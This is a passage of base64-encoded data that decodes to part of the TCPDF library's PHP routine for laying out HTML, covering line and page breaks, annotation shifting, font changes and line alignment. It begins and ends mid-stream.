ZWxsX3BhZGRpbmdbJ1InXSkpCgkJCQkJCQlBTkQgKCgoJHRoaXMtPnJ0bCkgQU5EICgoJHRoaXMtPnggLSAkaW1ndykgPCAoJHRoaXMtPmxNYXJnaW4gKyAkdGhpcy0+Y2VsbF9wYWRkaW5nWydMJ10pKSkKCQkJCQkJCU9SICgoISR0aGlzLT5ydGwpIEFORCAoKCR0aGlzLT54ICsgJGltZ3cpID4gKCR0aGlzLT53IC0gJHRoaXMtPnJNYXJnaW4gLSAkdGhpcy0+Y2VsbF9wYWRkaW5nWydSJ10pKSkpKSB7CgkJCQkJCQkvLyBhZGQgYXV0b21hdGljIGxpbmUgYnJlYWsKCQkJCQkJCSRhdXRvbGluZWJyZWFrID0gdHJ1ZTsKCQkJCQkJCSR0aGlzLT5MbignJywgJGNlbGwpOwoJCQkJCQkJaWYgKCghJGRvbVsoJGtleS0xKV1bJ3RhZyddKSBBTkQgKCRkb21bKCRrZXktMSldWyd2YWx1ZSddID09ICcgJykpIHsKCQkJCQkJCQkvLyBnbyBiYWNrIHRvIGV2YWx1YXRlIHRoaXMgbGluZSBicmVhawoJCQkJCQkJCS0tJGtleTsKCQkJCQkJCX0KCQkJCQkJfQoJCQkJCX0KCQkJCQlpZiAoISRhdXRvbGluZWJyZWFrKSB7CgkJCQkJCWlmICgkdGhpcy0+aW5QYWdlQm9keSgpKSB7CgkJCQkJCQkkcHJlX3kgPSAkdGhpcy0+eTsKCQkJCQkJCS8vIGNoZWNrIGZvciBwYWdlIGJyZWFrCgkJCQkJCQlpZiAoKCEkdGhpcy0+Y2hlY2tQYWdlQnJlYWsoJGltZ2gpKSBBTkQgKCR0aGlzLT55IDwgJHByZV95KSkgewoJCQkJCQkJCS8vIGZpeCBmb3IgbXVsdGljb2x1bW4gbW9kZQoJCQkJCQkJCSRzdGFydGxpbmV5ID0gJHRoaXMtPnk7CgkJCQkJCQl9CgkJCQkJCX0KCQkJCQkJaWYgKCR0aGlzLT5wYWdlID4gJHN0YXJ0bGluZXBhZ2UpIHsKCQkJCQkJCS8vIGZpeCBsaW5lIHNwbGl0dGVkIG92ZXIgdHdvIHBhZ2VzCgkJCQkJCQlpZiAoaXNzZXQoJHRoaXMtPmZvb3Rlcmxlblskc3RhcnRsaW5lcGFnZV0pKSB7CgkJCQkJCQkJJGN1cnBvcyA9ICR0aGlzLT5wYWdlbGVuWyRzdGFydGxpbmVwYWdlXSAtICR0aGlzLT5mb290ZXJsZW5bJHN0YXJ0bGluZXBhZ2VdOwoJCQkJCQkJfQoJCQkJCQkJLy8gbGluZSB0byBiZSBtb3ZlZCBvbmUgcGFnZSBmb3J3YXJkCgkJCQkJCQkkcGFnZWJ1ZmYgPSAkdGhpcy0+Z2V0UGFnZUJ1ZmZlcigkc3RhcnRsaW5lcGFnZSk7CgkJCQkJCQkkbGluZWJlZyA9IHN1YnN0cigkcGFnZWJ1ZmYsICRzdGFydGxpbmVwb3MsICgkY3VycG9zIC0gJHN0YXJ0bGluZXBvcykpOwoJCQkJCQkJJHRzdGFydCA9IHN1YnN0cigkcGFnZWJ1ZmYsIDAsICRzdGFydGxpbmVwb3MpOwoJCQkJCQkJJHRlbmQgPSBzdWJzdHIoJHRoaXMtPmdldFBhZ2VCdWZmZXIoJHN0YXJ0bGluZXBhZ2UpLCAkY3VycG9zKTsKCQkJCQkJCS8vIHJlbW92ZSBsaW5lIGZyb20gcHJldmlvdXMgcGFnZQoJCQkJCQkJJHRoaXMtPnNldFBhZ2VCdWZmZXIoJHN0YXJ0bGluZXBhZ2UsICR0c3RhcnQuJycuJHRlbmQpOwoJCQkJCQkJJHBhZ2VidWZmID0gJHRoaXMtPmdldFBhZ2VCdWZmZXIoJHRoaXMtPnBhZ2UpOwoJCQkJCQkJJHRzdGFydCA9IHN1YnN0cigkcGFnZWJ1ZmYsIDAsICR0aGlzLT5jbnRtcmtbJHRoaXMtPnBhZ2VdKTsKCQkJCQkJCSR0ZW5kID0gc3Vic3RyKCRwYWdlYnVmZiwgJHRoaXMtPmNudG1ya1skdGhpcy0+cGFnZV0pOwoJCQkJCQkJLy8gYWRkIGxpbmUgc3RhcnQgdG8gY3VycmVudCBwYWdlCgkJCQkJCQkkeXNoaWZ0ID0gKCRtaW5zdGFydGxpbmV5IC0gJHRoaXMtPnkpOwoJCQkJCQkJaWYgKCRmb250YWxpZ25lZCkgewoJCQkJCQkJCSR5c2hpZnQgKz0gKCRjdXJmb250c2l6ZSAvICR0aGlzLT5rKTsKCQkJCQkJCX0KCQkJCQkJCSR0cnkgPSBzcHJpbnRmKCcxIDAgMCAxIDAgJUYgY20nLCAoJHlzaGlmdCAqICR0aGlzLT5rKSk7CgkJCQkJCQkkdGhpcy0+c2V0UGFnZUJ1ZmZlcigkdGhpcy0+cGFnZSwgJHRzdGFydC4iXG5xXG4iLiR0cnkuIlxuIi4kbGluZWJlZy4iXG5RXG4iLiR0ZW5kKTsKCQkJCQkJCS8vIHNoaWZ0IHRoZSBhbm5vdGF0aW9ucyBhbmQgbGlua3MKCQkJCQkJCWlmIChpc3NldCgkdGhpcy0+UGFnZUFubm90c1skdGhpcy0+cGFnZV0pKSB7CgkJCQkJCQkJJG5leHRfcGFzayA9IGNvdW50KCR0aGlzLT5QYWdlQW5ub3RzWyR0aGlzLT5wYWdlXSk7CgkJCQkJCQl9IGVsc2UgewoJCQkJCQkJCSRuZXh0X3Bhc2sgPSAwOwoJCQkJCQkJfQoJCQkJCQkJaWYgKGlzc2V0KCR0aGlzLT5QYWdlQW5ub3RzWyRzdGFydGxpbmVwYWdlXSkpIHsKCQkJCQkJCQlmb3JlYWNoICgkdGhpcy0+UGFnZUFubm90c1skc3RhcnRsaW5lcGFnZV0gYXMgJHBhayA9PiAkcGFjKSB7CgkJCQkJCQkJCWlmICgkcGFrID49ICRwYXNrKSB7CgkJCQkJCQkJCQkkdGhpcy0+UGFnZUFubm90c1skdGhpcy0+cGFnZV1bXSA9ICRwYWM7CgkJCQkJCQkJCQl1bnNldCgkdGhpcy0+UGFnZUFubm90c1skc3RhcnRsaW5lcGFnZV1bJHBha10pOwoJCQkJCQkJCQkJJG5wYWsgPSBjb3VudCgkdGhpcy0+UGFnZUFubm90c1skdGhpcy0+cGFnZV0pIC0gMTsKCQkJCQkJCQkJCSR0aGlzLT5QYWdlQW5ub3RzWyR0aGlzLT5wYWdlXVskbnBha11bJ3knXSAtPSAkeXNoaWZ0OwoJCQkJCQkJCQl9CgkJCQkJCQkJfQoJCQkJCQkJfQoJCQkJCQkJJHBhc2sgPSAkbmV4dF9wYXNrOwoJCQkJCQkJJHN0YXJ0bGluZXBvcyA9ICR0aGlzLT5jbnRtcmtbJHRoaXMtPnBhZ2VdOwoJCQkJCQkJJHN0YXJ0bGluZXBhZ2UgPSAkdGhpcy0+cGFnZTsKCQkJCQkJCSRzdGFydGxpbmV5ID0gJHRoaXMtPnk7CgkJCQkJCQkkdGhpcy0+bmV3bGluZSA9IGZhbHNlOwoJCQkJCQl9CgkJCQkJCSR0aGlzLT55ICs9ICgkdGhpcy0+Z2V0Q2VsbEhlaWdodCgkY3VyZm9udHNpemUgLyAkdGhpcy0+aykgLSAoJGN1cmZvbnRkZXNjZW50ICogJHRoaXMtPmNlbGxfaGVpZ2h0X3JhdGlvKSAtICRpbWdoKTsKCQkJCQkJJG1pbnN0YXJ0bGluZXkgPSBtaW4oJHRoaXMtPnksICRtaW5zdGFydGxpbmV5KTsKCQkJCQkJJG1heGJvdHRvbWxpbmV5ID0gKCRzdGFydGxpbmV5ICsgJHRoaXMtPmdldENlbGxIZWlnaHQoJGN1cmZvbnRzaXplIC8gJHRoaXMtPmspKTsKCQkJCQl9CgkJCQl9IGVsc2VpZiAoaXNzZXQoJGRvbVska2V5XVsnZm9udG5hbWUnXSkgT1IgaXNzZXQoJGRvbVska2V5XVsnZm9udHN0eWxlJ10pIE9SIGlzc2V0KCRkb21bJGtleV1bJ2ZvbnRzaXplJ10pIE9SIGlzc2V0KCRkb21bJGtleV1bJ2xpbmUtaGVpZ2h0J10pKSB7CgkJCQkJLy8gYWNjb3VudCBmb3IgZGlmZmVyZW50IGZvbnQgc2l6ZQoJCQkJCSRwZm9udG5hbWUgPSAkY3VyZm9udG5hbWU7CgkJCQkJJHBmb250c3R5bGUgPSAkY3VyZm9udHN0eWxlOwoJCQkJCSRwZm9udHNpemUgPSAkY3VyZm9udHNpemU7CgkJCQkJJGZvbnRuYW1lID0gKGlzc2V0KCRkb21bJGtleV1bJ2ZvbnRuYW1lJ10pID8gJGRvbVska2V5XVsnZm9udG5hbWUnXSA6ICRjdXJmb250bmFtZSk7CgkJCQkJJGZvbnRzdHlsZSA9IChpc3NldCgkZG9tWyRrZXldWydmb250c3R5bGUnXSkgPyAkZG9tWyRrZXldWydmb250c3R5bGUnXSA6ICRjdXJmb250c3R5bGUpOwoJCQkJCSRmb250c2l6ZSA9IChpc3NldCgkZG9tWyRrZXldWydmb250c2l6ZSddKSA/ICRkb21bJGtleV1bJ2ZvbnRzaXplJ10gOiAkY3VyZm9udHNpemUpOwoJCQkJCSRmb250YXNjZW50ID0gJHRoaXMtPmdldEZvbnRBc2NlbnQoJGZvbnRuYW1lLCAkZm9udHN0eWxlLCAkZm9udHNpemUpOwoJCQkJCSRmb250ZGVzY2VudCA9ICR0aGlzLT5nZXRGb250RGVzY2VudCgkZm9udG5hbWUsICRmb250c3R5bGUsICRmb250c2l6ZSk7CgkJCQkJaWYgKCgkZm9udG5hbWUgIT0gJGN1cmZvbnRuYW1lKSBPUiAoJGZvbnRzdHlsZSAhPSAkY3VyZm9udHN0eWxlKSBPUiAoJGZvbnRzaXplICE9ICRjdXJmb250c2l6ZSkKCQkJCQkJT1IgKCR0aGlzLT5jZWxsX2hlaWdodF9yYXRpbyAhPSAkZG9tWyRrZXldWydsaW5lLWhlaWdodCddKQoJCQkJCQlPUiAoJGRvbVska2V5XVsndGFnJ10gQU5EICRkb21bJGtleV1bJ29wZW5pbmcnXSBBTkQgKCRkb21bJGtleV1bJ3ZhbHVlJ10gPT0gJ2xpJykpICkgewoJCQkJCQlpZiAoKCRrZXkgPCAoJG1heGVsIC0gMSkpIEFORCAoCgkJCQkJCQkJKCRkb21bJGtleV1bJ3RhZyddIEFORCAkZG9tWyRrZXldWydvcGVuaW5nJ10gQU5EICgkZG9tWyRrZXldWyd2YWx1ZSddID09ICdsaScpKQoJCQkJCQkJCU9SICgkdGhpcy0+Y2VsbF9oZWlnaHRfcmF0aW8gIT0gJGRvbVska2V5XVsnbGluZS1oZWlnaHQnXSkKCQkJCQkJCQlPUiAoISR0aGlzLT5uZXdsaW5lIEFORCBpc19udW1lcmljKCRmb250c2l6ZSkgQU5EIGlzX251bWVyaWMoJGN1cmZvbnRzaXplKQoJCQkJCQkJCUFORCAoJGZvbnRzaXplID49IDApIEFORCAoJGN1cmZvbnRzaXplID49IDApCgkJCQkJCQkJQU5EICgoJGZvbnRzaXplICE9ICRjdXJmb250c2l6ZSkgT1IgKCRmb250c3R5bGUgIT0gJGN1cmZvbnRzdHlsZSkgT1IgKCRmb250bmFtZSAhPSAkY3VyZm9udG5hbWUpKSkKCQkJCQkJCSkpIHsKCQkJCQkJCWlmICgkdGhpcy0+cGFnZSA+ICRzdGFydGxpbmVwYWdlKSB7CgkJCQkJCQkJLy8gZml4IGxpbmVzIHNwbGl0dGVkIG92ZXIgdHdvIHBhZ2VzCgkJCQkJCQkJaWYgKGlzc2V0KCR0aGlzLT5mb290ZXJsZW5bJHN0YXJ0bGluZXBhZ2VdKSkgewoJCQkJCQkJCQkkY3VycG9zID0gJHRoaXMtPnBhZ2VsZW5bJHN0YXJ0bGluZXBhZ2VdIC0gJHRoaXMtPmZvb3Rlcmxlblskc3RhcnRsaW5lcGFnZV07CgkJCQkJCQkJfQoJCQkJCQkJCS8vIGxpbmUgdG8gYmUgbW92ZWQgb25lIHBhZ2UgZm9yd2FyZAoJCQkJCQkJCSRwYWdlYnVmZiA9ICR0aGlzLT5nZXRQYWdlQnVmZmVyKCRzdGFydGxpbmVwYWdlKTsKCQkJCQkJCQkkbGluZWJlZyA9IHN1YnN0cigkcGFnZWJ1ZmYsICRzdGFydGxpbmVwb3MsICgkY3VycG9zIC0gJHN0YXJ0bGluZXBvcykpOwoJCQkJCQkJCSR0c3RhcnQgPSBzdWJzdHIoJHBhZ2VidWZmLCAwLCAkc3RhcnRsaW5lcG9zKTsKCQkJCQkJCQkkdGVuZCA9IHN1YnN0cigkdGhpcy0+Z2V0UGFnZUJ1ZmZlcigkc3RhcnRsaW5lcGFnZSksICRjdXJwb3MpOwoJCQkJCQkJCS8vIHJlbW92ZSBsaW5lIHN0YXJ0IGZyb20gcHJldmlvdXMgcGFnZQoJCQkJCQkJCSR0aGlzLT5zZXRQYWdlQnVmZmVyKCRzdGFydGxpbmVwYWdlLCAkdHN0YXJ0LicnLiR0ZW5kKTsKCQkJCQkJCQkkcGFnZWJ1ZmYgPSAkdGhpcy0+Z2V0UGFnZUJ1ZmZlcigkdGhpcy0+cGFnZSk7CgkJCQkJCQkJJHRzdGFydCA9IHN1YnN0cigkcGFnZWJ1ZmYsIDAsICR0aGlzLT5jbnRtcmtbJHRoaXMtPnBhZ2VdKTsKCQkJCQkJCQkkdGVuZCA9IHN1YnN0cigkcGFnZWJ1ZmYsICR0aGlzLT5jbnRtcmtbJHRoaXMtPnBhZ2VdKTsKCQkJCQkJCQkvLyBhZGQgbGluZSBzdGFydCB0byBjdXJyZW50IHBhZ2UKCQkJCQkJCQkkeXNoaWZ0ID0gKCRtaW5zdGFydGxpbmV5IC0gJHRoaXMtPnkpOwoJCQkJCQkJCSR0cnkgPSBzcHJpbnRmKCcxIDAgMCAxIDAgJUYgY20nLCAoJHlzaGlmdCAqICR0aGlzLT5rKSk7CgkJCQkJCQkJJHRoaXMtPnNldFBhZ2VCdWZmZXIoJHRoaXMtPnBhZ2UsICR0c3RhcnQuIlxucVxuIi4kdHJ5LiJcbiIuJGxpbmViZWcuIlxuUVxuIi4kdGVuZCk7CgkJCQkJCQkJLy8gc2hpZnQgdGhlIGFubm90YXRpb25zIGFuZCBsaW5rcwoJCQkJCQkJCWlmIChpc3NldCgkdGhpcy0+UGFnZUFubm90c1skdGhpcy0+cGFnZV0pKSB7CgkJCQkJCQkJCSRuZXh0X3Bhc2sgPSBjb3VudCgkdGhpcy0+UGFnZUFubm90c1skdGhpcy0+cGFnZV0pOwoJCQkJCQkJCX0gZWxzZSB7CgkJCQkJCQkJCSRuZXh0X3Bhc2sgPSAwOwoJCQkJCQkJCX0KCQkJCQkJCQlpZiAoaXNzZXQoJHRoaXMtPlBhZ2VBbm5vdHNbJHN0YXJ0bGluZXBhZ2VdKSkgewoJCQkJCQkJCQlmb3JlYWNoICgkdGhpcy0+UGFnZUFubm90c1skc3RhcnRsaW5lcGFnZV0gYXMgJHBhayA9PiAkcGFjKSB7CgkJCQkJCQkJCQlpZiAoJHBhayA+PSAkcGFzaykgewoJCQkJCQkJCQkJCSR0aGlzLT5QYWdlQW5ub3RzWyR0aGlzLT5wYWdlXVtdID0gJHBhYzsKCQkJCQkJCQkJCQl1bnNldCgkdGhpcy0+UGFnZUFubm90c1skc3RhcnRsaW5lcGFnZV1bJHBha10pOwoJCQkJCQkJCQkJCSRucGFrID0gY291bnQoJHRoaXMtPlBhZ2VBbm5vdHNbJHRoaXMtPnBhZ2VdKSAtIDE7CgkJCQkJCQkJCQkJJHRoaXMtPlBhZ2VBbm5vdHNbJHRoaXMtPnBhZ2VdWyRucGFrXVsneSddIC09ICR5c2hpZnQ7CgkJCQkJCQkJCQl9CgkJCQkJCQkJCX0KCQkJCQkJCQl9CgkJCQkJCQkJJHBhc2sgPSAkbmV4dF9wYXNrOwoJCQkJCQkJCSRzdGFydGxpbmVwb3MgPSAkdGhpcy0+Y250bXJrWyR0aGlzLT5wYWdlXTsKCQkJCQkJCQkkc3RhcnRsaW5lcGFnZSA9ICR0aGlzLT5wYWdlOwoJCQkJCQkJCSRzdGFydGxpbmV5ID0gJHRoaXMtPnk7CgkJCQkJCQl9CgkJCQkJCQlpZiAoIWlzc2V0KCRkb21bJGtleV1bJ2xpbmUtaGVpZ2h0J10pKSB7CgkJCQkJCQkJJGRvbVska2V5XVsnbGluZS1oZWlnaHQnXSA9ICR0aGlzLT5jZWxsX2hlaWdodF9yYXRpbzsKCQkJCQkJCX0KCQkJCQkJCWlmICghJGRvbVska2V5XVsnYmxvY2snXSkgewoJCQkJCQkJCWlmICghKGlzc2V0KCRkb21bKCRrZXkgKyAxKV0pIEFORCAkZG9tWygka2V5ICsgMSldWyd0YWcnXSBBTkQgKCEkZG9tWygka2V5ICsgMSldWydvcGVuaW5nJ10pIEFORCAoJGRvbVsoJGtleSArIDEpXVsndmFsdWUnXSAhPSAnbGknKSBBTkQgJGRvbVska2V5XVsndGFnJ10gQU5EICghJGRvbVska2V5XVsnb3BlbmluZyddKSkpIHsKCQkJCQkJCQkJJHRoaXMtPnkgKz0gKCgoKCRjdXJmb250c2l6ZSAqICR0aGlzLT5jZWxsX2hlaWdodF9yYXRpbykgLSAoJGZvbnRzaXplICogJGRvbVska2V5XVsnbGluZS1oZWlnaHQnXSkpIC8gJHRoaXMtPmspICsgJGN1cmZvbnRhc2NlbnQgLSAkZm9udGFzY2VudCAtICRjdXJmb250ZGVzY2VudCArICRmb250ZGVzY2VudCkgLyAyOwoJCQkJCQkJCX0KCQkJCQkJCQlpZiAoKCRkb21bJGtleV1bJ3ZhbHVlJ10gIT0gJ3N1cCcpIEFORCAoJGRvbVska2V5XVsndmFsdWUnXSAhPSAnc3ViJykpIHsKCQkJCQkJCQkJJGN1cnJlbnRfbGluZV9hbGlnbl9kYXRhID0gYXJyYXkoJGtleSwgJG1pbnN0YXJ0bGluZXksICRtYXhib3R0b21saW5leSk7CgkJCQkJCQkJCWlmIChpc3NldCgkbGluZV9hbGlnbl9kYXRhKSBBTkQgKCgkbGluZV9hbGlnbl9kYXRhWzBdID09ICgka2V5IC0gMSkpIE9SICgoJGxpbmVfYWxpZ25fZGF0YVswXSA9PSAoJGtleSAtIDIpKSBBTkQgKGlzc2V0KCRkb21bKCRrZXkgLSAxKV0pKSBBTkQgKHByZWdfbWF0Y2goJy9eKFtcc10rKSQvJywgJGRvbVsoJGtleSAtIDEpXVsndmFsdWUnXSkgPiAwKSkpKSB7CgkJCQkJCQkJCQkkbWluc3RhcnRsaW5leSA9IG1pbigkdGhpcy0+eSwgJGxpbmVfYWxpZ25fZGF0YVsxXSk7CgkJCQkJCQkJCQkkbWF4Ym90dG9tbGluZXkgPSBtYXgoKCR0aGlzLT55ICsgJHRoaXMtPmdldENlbGxIZWlnaHQoJGZvbnRzaXplIC8gJHRoaXMtPmspKSwgJGxpbmVfYWxpZ25fZGF0YVsyXSk7CgkJCQkJCQkJCX0gZWxzZSB7CgkJCQkJCQkJCQkkbWluc3RhcnRsaW5leSA9IG1pbigkdGhpcy0+eSwgJG1pbnN0YXJ0bGluZXkpOwoJCQkJCQkJCQkJJG1heGJvdHRvbWxpbmV5ID0gbWF4KCgkdGhpcy0+eSArICR0aGlzLT5nZXRDZWxsSGVpZ2h0KCRmb250c2l6ZSAvICR0aGlzLT5rKSksICRtYXhib3R0b21saW5leSk7CgkJCQkJCQkJCX0KCQkJCQkJCQkJJGxpbmVfYWxpZ25fZGF0YSA9ICRjdXJyZW50X2xpbmVfYWxpZ25fZGF0YTsKCQkJCQkJCQl9CgkJCQkJCQl9CgkJCQkJCQkkdGhpcy0+Y2VsbF9oZWlnaHRfcmF0aW8gPSAkZG9tWyRrZXldWydsaW5lLWhlaWdodCddOwoJCQkJCQkJJGZvbnRhbGlnbmVkID0gdHJ1ZTsKCQkJCQkJfQoJCQkJCQkkdGhpcy0+c2V0Rm9udCgkZm9udG5hbWUsICRmb250c3R5bGUsICRmb250c2l6ZSk7CgkJCQkJCS8vIHJlc2V0IHJvdyBoZWlnaHQKCQkJCQkJJHRoaXMtPnJlc2V0TGFzdEgoKTsKCQkJCQkJJGN1cmZvbnRuYW1lID0gJGZvbnRuYW1lOwoJCQkJCQkkY3VyZm9udHN0eWxlID0gJGZvbnRzdHlsZTsKCQkJCQkJJGN1cmZvbnRzaXplID0gJGZvbnRzaXplOwoJCQkJCQkkY3VyZm9udGFzY2VudCA9ICRmb250YXNjZW50OwoJCQkJCQkkY3VyZm9udGRlc2NlbnQgPSAkZm9udGRlc2NlbnQ7CgkJCQkJfQoJCQkJfQoJCQkJLy8gc2V0IHRleHQgcmVuZGVyaW5nIG1vZGUKCQkJCSR0ZXh0c3Ryb2tlID0gaXNzZXQoJGRvbVska2V5XVsnc3Ryb2tlJ10pID8gJGRvbVska2V5XVsnc3Ryb2tlJ10gOiAkdGhpcy0+dGV4dHN0cm9rZXdpZHRoOwoJCQkJJHRleHRmaWxsID0gaXNzZXQoJGRvbVska2V5XVsnZmlsbCddKSA/ICRkb21bJGtleV1bJ2ZpbGwnXSA6ICgoJHRoaXMtPnRleHRyZW5kZXJtb2RlICUgMikgPT0gMCk7CgkJCQkkdGV4dGNsaXAgPSBpc3NldCgkZG9tWyRrZXldWydjbGlwJ10pID8gJGRvbVska2V5XVsnY2xpcCddIDogKCR0aGlzLT50ZXh0cmVuZGVybW9kZSA+IDMpOwoJCQkJJHRoaXMtPnNldFRleHRSZW5kZXJpbmdNb2RlKCR0ZXh0c3Ryb2tlLCAkdGV4dGZpbGwsICR0ZXh0Y2xpcCk7CgkJCQlpZiAoaXNzZXQoJGRvbVska2V5XVsnZm9udC1zdHJldGNoJ10pIEFORCAoJGRvbVska2V5XVsnZm9udC1zdHJldGNoJ10gIT09IGZhbHNlKSkgewoJCQkJCSR0aGlzLT5zZXRGb250U3RyZXRjaGluZygkZG9tWyRrZXldWydmb250LXN0cmV0Y2gnXSk7CgkJCQl9CgkJCQlpZiAoaXNzZXQoJGRvbVska2V5XVsnbGV0dGVyLXNwYWNpbmcnXSkgQU5EICgkZG9tWyRrZXldWydsZXR0ZXItc3BhY2luZyddICE9PSBmYWxzZSkpIHsKCQkJCQkkdGhpcy0+c2V0Rm9udFNwYWNpbmcoJGRvbVska2V5XVsnbGV0dGVyLXNwYWNpbmcnXSk7CgkJCQl9CgkJCQlpZiAoKCRwbGFsaWduID09ICdKJykgQU5EICRkb21bJGtleV1bJ2Jsb2NrJ10pIHsKCQkJCQkkcGxhbGlnbiA9ICcnOwoJCQkJfQoJCQkJLy8gZ2V0IGN1cnJlbnQgcG9zaXRpb24gb24gcGFnZSBidWZmZXIKCQkJCSRjdXJwb3MgPSAkdGhpcy0+cGFnZWxlblskc3RhcnRsaW5lcGFnZV07CgkJCQlpZiAoaXNzZXQoJGRvbVska2V5XVsnYmdjb2xvciddKSBBTkQgKCRkb21bJGtleV1bJ2JnY29sb3InXSAhPT0gZmFsc2UpKSB7CgkJCQkJJHRoaXMtPnNldEZpbGxDb2xvckFycmF5KCRkb21bJGtleV1bJ2JnY29sb3InXSk7CgkJCQkJJHdmaWxsID0gdHJ1ZTsKCQkJCX0gZWxzZSB7CgkJCQkJJHdmaWxsID0gJGZpbGwgfCBmYWxzZTsKCQkJCX0KCQkJCWlmIChpc3NldCgkZG9tWyRrZXldWydmZ2NvbG9yJ10pIEFORCAoJGRvbVska2V5XVsnZmdjb2xvciddICE9PSBmYWxzZSkpIHsKCQkJCQkkdGhpcy0+c2V0VGV4dENvbG9yQXJyYXkoJGRvbVska2V5XVsnZmdjb2xvciddKTsKCQkJCX0KCQkJCWlmIChpc3NldCgkZG9tWyRrZXldWydzdHJva2Vjb2xvciddKSBBTkQgKCRkb21bJGtleV1bJ3N0cm9rZWNvbG9yJ10gIT09IGZhbHNlKSkgewoJCQkJCSR0aGlzLT5zZXREcmF3Q29sb3JBcnJheSgkZG9tWyRrZXldWydzdHJva2Vjb2xvciddKTsKCQkJCX0KCQkJCWlmIChpc3NldCgkZG9tWyRrZXldWydhbGlnbiddKSkgewoJCQkJCSRsYWxpZ24gPSAkZG9tWyRrZXldWydhbGlnbiddOwoJCQkJfQoJCQkJaWYgKFRDUERGX1NUQVRJQzo6ZW1wdHlfc3RyaW5nKCRsYWxpZ24pKSB7CgkJCQkJJGxhbGlnbiA9ICRhbGlnbjsKCQkJCX0KCQkJfQoJCQkvLyBhbGlnbiBsaW5lcwoJCQlpZiAoJHRoaXMtPm5ld2xpbmUgQU5EIChzdHJsZW4oJGRvbVska2V5XVsndmFsdWUnXSkgPiAwKSBBTkQgKCRkb21bJGtleV1bJ3ZhbHVlJ10gIT0gJ3RkJykgQU5EICgkZG9tWyRrZXldWyd2YWx1ZSddICE9ICd0aCcpKSB7CgkJCQkkbmV3bGluZSA9IHRydWU7CgkJCQkkZm9udGFsaWduZWQgPSBmYWxzZTsKCQkJCS8vIHdlIGFyZSBhdCB0aGUgYmVnaW5uaW5nIG9mIGEgbmV3IGxpbmUKCQkJCWlmIChpc3NldCgkc3RhcnRsaW5leCkpIHsKCQkJCQkkeXNoaWZ0ID0gKCRtaW5zdGFydGxpbmV5IC0gJHN0YXJ0bGluZXkpOwoJCQkJCWlmICgoJHlzaGlmdCA+IDApIE9SICgkdGhpcy0+cGFnZSA+ICRzdGFydGxpbmVwYWdlKSkgewoJCQkJCQkkeXNoaWZ0ID0gMDsKCQkJCQl9CgkJCQkJJHRfeCA9IDA7CgkJCQkJLy8gdGhlIGxhc3QgbGluZSBtdXN0IGJlIHNoaWZ0ZWQgdG8gYmUgYWxpZ25lZCBhcyByZXF1ZXN0ZWQKCQkJCQkkbGluZXcgPSBhYnMoJHRoaXMtPmVuZGxpbmV4IC0gJHN0YXJ0bGluZXgpOwoJCQkJCWlmICgkdGhpcy0+aW54b2JqKSB7CgkJCQkJCS8vIHdlIGFyZSBpbnNpZGUgYW4gWE9iamVjdCB0ZW1wbGF0ZQoJCQkJCQkkcHN0YXJ0ID0gc3Vic3RyKCR0aGlzLT54b2JqZWN0c1skdGhpcy0+eG9iamlkXVsnb3V0ZGF0YSddLCAwLCAkc3RhcnRsaW5lcG9zKTsKCQkJCQkJaWYgKGlzc2V0KCRvcGVudGFncG9zKSkgewoJCQkJCQkJJG1pZHBvcyA9ICRvcGVudGFncG9zOwoJCQkJCQl9IGVsc2UgewoJCQkJCQkJJG1pZHBvcyA9IDA7CgkJCQkJCX0KCQkJCQkJaWYgKCRtaWRwb3MgPiAwKSB7CgkJCQkJCQkkcG1pZCA9IHN1YnN0cigkdGhpcy0+eG9iamVjdHNbJHRoaXMtPnhvYmppZF1bJ291dGRhdGEnXSwgJHN0YXJ0bGluZXBvcywgKCRtaWRwb3MgLSAkc3RhcnRsaW5lcG9zKSk7CgkJCQkJCQkkcGVuZCA9IHN1YnN0cigkdGhpcy0+eG9iamVjdHNbJHRoaXMtPnhvYmppZF1bJ291dGRhdGEnXSwgJG1pZHBvcyk7CgkJCQkJCX0gZWxzZSB7CgkJCQkJCQkkcG1pZCA9IHN1YnN0cigkdGhpcy0+eG9iamVjdHNbJHRoaXMtPnhvYmppZF1bJ291dGRhdGEnXSwgJHN0YXJ0bGluZXBvcyk7CgkJCQkJCQkkcGVuZCA9ICcnOwoJCQkJCQl9CgkJCQkJfSBlbHNlIHsKCQkJCQkJJHBzdGFydCA9IHN1YnN0cigkdGhpcy0+Z2V0UGFnZUJ1ZmZlcigkc3RhcnRsaW5lcGFnZSksIDAsICRzdGFydGxpbmVwb3MpOwoJCQkJCQlpZiAoaXNzZXQoJG9wZW50YWdwb3MpIEFORCBpc3NldCgkdGhpcy0+Zm9vdGVybGVuWyRzdGFydGxpbmVwYWdlXSkgQU5EICghJHRoaXMtPkluRm9vdGVyKSkgewoJCQkJCQkJJHRoaXMtPmZvb3RlcnBvc1skc3RhcnRsaW5lcGFnZV0gPSAkdGhpcy0+cGFnZWxlblskc3RhcnRsaW5lcGFnZV0gLSAkdGhpcy0+Zm9vdGVybGVuWyRzdGFydGxpbmVwYWdlXTsKCQkJCQkJCSRtaWRwb3MgPSBtaW4oJG9wZW50YWdwb3MsICR0aGlzLT5mb290ZXJwb3NbJHN0YXJ0bGluZXBhZ2VdKTsKCQkJCQkJfSBlbHNlaWYgKGlzc2V0KCRvcGVudGFncG9zKSkgewoJCQkJCQkJJG1pZHBvcyA9ICRvcGVudGFncG9zOwoJCQkJCQl9IGVsc2VpZiAoaXNzZXQoJHRoaXMtPmZvb3Rlcmxlblskc3RhcnRsaW5lcGFnZV0pIEFORCAoISR0aGlzLT5JbkZvb3RlcikpIHsKCQkJCQkJCSR0aGlzLT5mb290ZXJwb3NbJHN0YXJ0bGluZXBhZ2VdID0gJHRoaXMtPnBhZ2VsZW5bJHN0YXJ0bGluZXBhZ2VdIC0gJHRoaXMtPmZvb3Rlcmxlblskc3RhcnRsaW5lcGFnZV07CgkJCQkJCQkkbWlkcG9zID0gJHRoaXMtPmZvb3RlcnBvc1skc3RhcnRsaW5lcGFnZV07CgkJCQkJCX0gZWxzZSB7CgkJCQkJCQkkbWlkcG9zID0gMDsKCQkJCQkJfQoJCQkJCQlpZiAoJG1pZHBvcyA+IDApIHsKCQkJCQkJCSRwbWlkID0gc3Vic3RyKCR0aGlzLT5nZXRQYWdlQnVmZmVyKCRzdGFydGxpbmVwYWdlKSwgJHN0YXJ0bGluZXBvcywgKCRtaWRwb3MgLSAkc3RhcnRsaW5lcG9zKSk7CgkJCQkJCQkkcGVuZCA9IHN1YnN0cigkdGhpcy0+Z2V0UGFnZUJ1ZmZlcigkc3RhcnRsaW5lcGFnZSksICRtaWRwb3MpOwoJCQkJCQl9IGVsc2UgewoJCQkJCQkJJHBtaWQgPSBzdWJzdHIoJHRoaXMtPmdldFBhZ2VCdWZmZXIoJHN0YXJ0bG